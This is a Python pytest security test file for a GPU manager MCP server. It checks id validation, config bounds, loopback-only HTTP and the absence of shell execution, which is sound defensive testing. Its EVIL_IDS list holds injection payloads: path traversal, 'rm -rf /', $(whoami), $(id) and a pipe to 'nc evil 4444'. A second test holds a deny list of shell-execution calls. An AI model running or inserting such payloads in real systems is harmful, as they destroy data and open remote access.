"""Security posture: injection attempts, config validation, command bounds."""

from __future__ import annotations

import errno

import pytest

from gpu_manager_mcp.backends.amd import _read_int
from gpu_manager_mcp.config import Config
from gpu_manager_mcp.server import GpuManager
from tests.conftest import FakeBackend

EVIL_IDS = [
    "",
    " ",
    "../etc/passwd",
    "..\\..\\windows\\system32",
    "amd-0000:03:00.0; rm -rf /",
    "amd-0000:03:00.0$(whoami)",
    "amd-0000:03:00.0|nc evil 4444",
    "\x00amd",
    "a" * 5000,
    "*/*",
    "$(id)",
]


def _mgr() -> GpuManager:
    cfg = Config()
    cfg.history_db_path = ":memory:"
    return GpuManager(cfg, backends=[FakeBackend(gpu_ids=["fake-0"])])


@pytest.mark.parametrize("evil", EVIL_IDS)
def test_malicious_gpu_ids_rejected_cleanly(evil):
    mgr = _mgr()
    with pytest.raises(Exception) as exc:
        mgr._require_device(evil)
    # the error must not echo the payload into any shell-like context
    assert "unknown gpu_id" in str(exc.value)


def test_no_shell_execution_surface():
    """The package must not expose any tool that runs arbitrary commands."""
    import gpu_manager_mcp.server as srv

    src = open(srv.__file__).read()
    for forbidden in ("shell=True", "os.system(", "subprocess.Popen(", "eval(", "exec("):
        assert forbidden not in src, forbidden


def test_helper_commands_are_allowlisted():
    cfg = Config()
    for name, argv in cfg.allowed_commands.items():
        assert isinstance(argv, list) and argv[0] == name


def test_command_timeout_positive():
    assert Config().command_timeout_seconds > 0


def test_invalid_config_rejected():
    cfg = Config()
    cfg.sample_interval_seconds = 0
    assert cfg.validate()
    cfg2 = Config()
    cfg2.http_host = "0.0.0.0"  # noqa: S104  deliberately invalid; must be rejected
    cfg2.http_enabled = True
    assert any("loopback" in p for p in cfg2.validate())


def test_http_defaults_to_loopback():
    cfg = Config()
    assert cfg.http_host in ("127.0.0.1", "localhost", "::1")
    assert cfg.http_enabled is False


def test_read_int_never_invents_zero():
    mv = _read_int(
        type("P", (), {"read_text": lambda self: (_ for _ in ()).throw(OSError(errno.EIO, "io"))})()
    )
    assert mv.available is False
    assert mv.value is None
